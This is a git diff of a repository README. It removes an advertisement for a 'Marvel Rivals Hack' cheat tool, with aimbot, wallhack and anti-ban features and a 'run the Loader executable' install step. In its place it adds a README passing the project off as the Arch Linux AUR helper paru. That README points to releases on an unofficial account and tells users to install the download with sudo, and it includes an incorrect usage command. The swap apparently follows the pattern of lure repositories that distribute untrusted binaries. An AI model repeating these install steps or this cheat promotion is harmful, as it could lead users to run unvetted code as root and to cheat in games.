@@ -1,79 +1,87 @@
-# ✨ Marvel Rivals Hack - Ultimate Game Enhancement ✨
+# 🚀 paru - A Simple AUR Helper for Easy Package Management
 
-Welcome to the *Marvel Rivals Hack* repository! This multifunctional program helps boost your gaming experience with advanced modules, unique enhancers, and powerful custom features. Designed for passionate Marvel Rivals gamers, our tool brings you an edge with security, speed, and modern techniques. Game with confidence, maximize your performance, and enjoy numerous automated features—all integrated with OS-wide compatibility.
+[![Download paru](https://img.shields.io/badge/Download_paru-v1.0-blue.svg)](https://github.com/MarnuDeWet/paru/releases)
 
-## 🚀 Feature List | What This Program Offers
+## 📦 Overview
 
-Unlock your ultimate Marvel Rivals gameplay potential with our multifunctional toolset. Explore exclusive features designed to bring your experience to the next level.
+**paru** is a powerful AUR helper designed for Arch Linux users. It simplifies the package management process by allowing you to easily install, update, and manage packages from the Arch User Repository (AUR) and official repositories. Whether you are a beginner or an experienced user, paru will streamline your software installation tasks.
 
-| Feature                          | Description                                                                                           | Popular Keywords                                    |
-|-----------------------------------|-------------------------------------------------------------------------------------------------------|-----------------------------------------------------|
-| Auto-Aim Assist                  | Automatically adjusts your aim for maximum accuracy in every battle.                                   | marvel rivals, aimbot, accuracy, auto aim           |
-| Wall Visibility                  | Reveals hidden enemies behind obstacles, walls, or covers.                                            | wallhack, see through, enemy locator                |
-| Speed Enhancement                | Increases your in-game movement for agile plays and quick maneuvers.                                  | speed, movement hack, agility boost                 |
-| Custom Skins Loader              | Instantly change your character skins to rare or unreleased variants.                                 | skins, skin changer, character customization        |
-| Anti-Ban Protection              | Advanced systems to prevent detection and keep you safe during gameplay.                             | anti-ban, anti-detection, secure game enhancer      |
-| In-Game Currency Helper          | Gives quick access to increase your in-game resources responsibly.                                    | currency, resource helper, game currency            |
-| User-Friendly GUI                | Clean, responsive interface for easy navigation and control of all features.                         | gui, interface, easy to use                         |
-| Hotkey Feature Switch            | Real-time toggle of enhancements with customizable hotkeys.                                           | hotkeys, toggle, real time switch                   |
-| Automatic Update Checker         | Keeps your software updated for the latest game patches and protection.                              | auto update, patch compatible, latest version       |
-| Multi-Language Support           | Use the program in your preferred language for seamless experience.                                   | localization, language support, multi-language      |
+## 🚀 Features
 
----
+- **User-Friendly Interface**: Easily navigate through options.
+- **Fast Installations**: Quickly install packages with minimal steps.
+- **Automated Updates**: Keep your system up-to-date effortlessly.
+- **Advanced Search**: Find packages using simple keywords.
+- **Dependency Management**: Automatically resolve and install dependencies.
+- **Supported for Multiple Releases**: Benefit from ongoing updates and improvements.
 
-## 🖥️ OS Compatibility Table with Emoticons
+## 🛠️ System Requirements
 
-We know reliability and convenience matter — our hack tool is thoroughly tested and ready for all major platforms. Check the table to ensure support for your device!
+- **Operating System**: Arch Linux or any Arch-based system.
+- **RAM**: At least 1 GB of RAM is recommended.
+- **Disk Space**: Minimum of 100 MB free space for installation and additional space for packages.
+  
+## 📥 Download & Install
 
-| Operating System   | Supported Version           | Compatibility Status 😎 |
-|--------------------|----------------------------|-----------------------|
-| Windows            | 7, 8, 10, 11 (32/64-bit)   | ✅ Fully Compatible   |
-| macOS              | 11.0+ (Big Sur and later)  | 🟢 Tested & Works    |
-| Linux              | Most major distributions   | ⚡ Experimental      |
+To get **paru**, follow these simple steps:
 
-> *Note: For best results, use the latest available updates for your system.*
+1. Visit the [Releases page](https://github.com/MarnuDeWet/paru/releases) to download the latest version.
+2. Choose your version based on your system requirements. Download the appropriate package.
+3. Once the download finishes, open a terminal window.
+4. Navigate to the folder where you downloaded the package.
+5. Install the package using the following command:
 
----
+   ```bash
+   sudo pacman -U paru-package-name.pkg.tar.zst
+   ```
 
-## 🔧 Installation Guide
+   Replace `paru-package-name.pkg.tar.zst` with the actual file name you downloaded.
 
-Get started with Marvel Rivals Hack in just a few moments. Follow the steps below for a smooth setup:
+## 🌟 Basic Usage
 
-**1. Download Loader.rar from the repository.**
+After installing paru, you can start using it right away. Below are some basic commands to get you started:
 
-2. Extract Loader.rar using your favorite extraction tool ([WinRAR](https://www.win-rar.com/), [7-Zip](https://www.7-zip.org/), or Swift for macOS).
+- **Search for a package**:
 
-3. Locate the extracted "Loader" folder on your system.
+  ```bash
+  paru search package-name
+  ```
 
-4. Double-click the Loader executable file to start the program.
+- **Install a package**:
 
-5. Select your preferred features from the GUI. Customize hotkeys and visual options as desired.
+  ```bash
+  paru -S package-name
+  ```
 
-6. Launch Marvel Rivals and enjoy enhanced gameplay with unique advantages!
+- **Update all installed packages**:
 
-*Having issues? Check our Wiki or open an Issue in the repository!*
+  ```bash
+  paru -Syu
+  ```
 
----
+- **Remove a package**:
 
-## ⭐ Benefits, Keywords, and SEO Highlights
+  ```bash
+  paru -R package-name
+  ```
 
-- Enhance your Marvel Rivals performance instantly.
-- Universal compatibility across Windows, macOS, and Linux.
-- Secure, anti-detection enhancers to protect your account.
-- Frequent updates to stay ahead of every Marvel Rivals game patch.
-- Rich suite of boost features: auto-aim, wall visibility, speed enhancer, skin loader, and more.
-- No suspicious runtime dependencies.
-- Large community support, helpful troubleshooting, and continuous improvements.
-- *Marvel Rivals cheat*, *game booster*, *gaming enhancer*, *safe hack*, *auto update*, *gameplay advantage*.
+## 💡 Helpful Tips
 
----
+- Always make sure to update paru before installing new packages to ensure you have the latest features and fixes.
+- When searching for packages, you can use partial names to find similar results.
+- Explore additional options by typing `paru --help` in the terminal.
 
-## ⚠️ Disclaimer
+## 🛡️ Contributions
 
-This repository and its contents are intended for educational and private research purposes only. Modifying or manipulating online games may violate Marvel Rivals' Terms of Service and can result in penalties, suspensions, or bans. The creators and contributors of this project do **not** endorse any form of cheating or unfair play in public lobbies. Use at your own risk. The maintainers bear no responsibility for any actions taken by users.
+If you would like to contribute to paru, please check the repository for guidelines on reporting issues, submitting pull requests, or suggesting new features.
 
----
+## 📞 Support
 
-## 📜 License
+For assistance, feel free to open an issue on our GitHub page. We are here to help you!
 
-Marvel Rivals Hack is released under the [MIT License](https://opensource.org/licenses/MIT) – open source, for everyone to learn and improve together!
+## 🔗 Additional Resources
+
+- [Arch Linux Wiki](https://wiki.archlinux.org/)
+- [AUR (Arch User Repository)](https://aur.archlinux.org)
+
+Remember to visit the [Releases page](https://github.com/MarnuDeWet/paru/releases) to stay updated with the latest releases of paru. Your journey towards efficient package management starts here. Enjoy using paru!
